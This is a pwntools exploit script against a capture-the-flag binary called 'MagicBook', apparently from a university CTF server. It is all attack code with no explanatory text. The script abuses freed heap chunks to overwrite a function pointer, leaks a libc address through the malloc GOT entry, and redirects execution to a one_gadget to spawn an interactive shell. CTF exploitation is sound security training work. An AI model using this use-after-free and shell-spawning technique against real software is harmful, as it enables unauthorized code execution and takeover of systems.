from pwn import *
import sys


Host = 'bamboofox.cs.nctu.edu.tw'
Port = 58798

if len(sys.argv) == 1:
    r = process('./MagicBook', env={'LD_PRELOAD': './libc.so.6'})
else:
    r = remote(Host, Port)


def add_chant(idx, size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)

def spell_it(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

def del_chant(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))

sleep(10)

add_chant(0, 0x20, 'A'*4)
add_chant(1, 0x20, 'A'*4)
del_chant(0)
del_chant(1)

malloc_got = 0x000000000602048
one_gadget = 0x4526a 

add_chant(2, 0x10, p64(0x400826) + p64(malloc_got))
spell_it(0)
r.recvuntil('Magic Time !!! \n')
libc = u64(r.recvuntil('\n')[0:6].ljust(8, '\x00')) - 0x0000084130 
log.info('libc: ' + hex(libc))


add_chant(0, 0x20, 'A')
add_chant(1, 0x20, 'A')
del_chant(0)
del_chant(1)
add_chant(2, 0x10, p64(0x400c98) )

add_chant(1, 0x20, 'A')
add_chant(2, 0x20, 'A')
del_chant(1)
del_chant(2)
add_chant(3, 0x10, p64(0x400aa7))

add_chant(2, 0x20, 'A')
add_chant(3, 0x20, 'A')
del_chant(2)
del_chant(3)
add_chant(4, 0x10, p64(libc+one_gadget))


spell_it(1)
for i in range(0,10):
    r.recvuntil(':')
    r.sendline('1')

r.recvuntil(':')
r.sendline('0')

spell_it(2)

r.interactive()

